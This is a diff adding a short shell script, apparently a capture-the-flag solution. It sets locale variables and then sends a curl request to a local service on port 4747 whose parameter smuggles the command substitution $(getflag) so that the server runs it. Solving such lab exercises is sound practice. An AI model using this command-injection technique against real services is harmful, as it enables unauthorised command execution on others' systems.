@@ -1,0 +1,6 @@
+export LANGUAGE=en_US.UTF-8
+export LANG=en_US.UTF-8
+export LC_ALL=en_US.UTF-8
+
+# we send GET parameters x which contain the return of getflag func
+curl localhost:4747?x='$(getflag)'
